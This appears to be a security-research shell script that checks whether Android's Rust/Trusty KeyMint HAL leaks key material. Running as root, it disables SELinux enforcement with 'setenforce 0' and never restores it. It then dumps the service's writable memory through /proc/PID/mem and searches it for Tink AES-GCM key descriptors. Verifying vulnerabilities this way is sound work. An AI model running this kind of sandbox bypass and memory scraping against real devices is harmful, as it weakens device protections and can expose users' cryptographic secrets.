#!/system/bin/sh
# Shell script to verify cryptographic key leakage in KeyMint HAL process memory.
# To be run on the target Android device as root.

# 1. Identify the PID of the Rust/Trusty KeyMint HAL service
PID=$(pidof android.hardware.security.keymint-service.rust.trusty)
if [ -z "$PID" ]; then
    echo "[!] KeyMint Rust service not found!"
    exit 1
fi
echo "[+] Found KeyMint Rust service PID: $PID"

# 2. Temporarily put SELinux in Permissive mode to bypass sandbox restrictions
setenforce 0
echo "[*] SELinux set to Permissive."

# 3. Read maps and scan writable (rw-p) memory segments
PAGE_SIZE=4096
cat /proc/$PID/maps | grep "rw-p" | while read -r line; do
    ADDR=$(echo $line | awk '{print $1}')
    START=$(echo $ADDR | cut -d'-' -f1)
    END=$(echo $ADDR | cut -d'-' -f2)
    START_DEC=$((16#$START))
    END_DEC=$((16#$END))
    SIZE=$(($END_DEC - $START_DEC))
    
    # Calculate offset and count aligned to 4KB page size for fast dumping
    SKIP=$((START_DEC / 4096))
    COUNT=$(( (SIZE + 4095) / 4096 ))
    
    # Dump the memory segment and search for the Tink key descriptor
    dd if=/proc/$PID/mem bs=4096 skip=$SKIP count=$COUNT 2>/dev/null | grep -q -a "google.crypto.tink.AesGcmKey"
    if [ $? -eq 0 ]; then
        echo -e "\n\033[1;31m[!!!] KEY LEAK DETECTED in segment $ADDR!\033[0m"
        echo "--- Leaked Metadata & Identifiers in Segment ---"
        dd if=/proc/$PID/mem bs=4096 skip=$SKIP count=$COUNT 2>/dev/null | strings | grep -E "tink|niap|Keystore|KeyMint" | head -n 10
    fi
done
echo -e "\n[*] Memory scan completed."
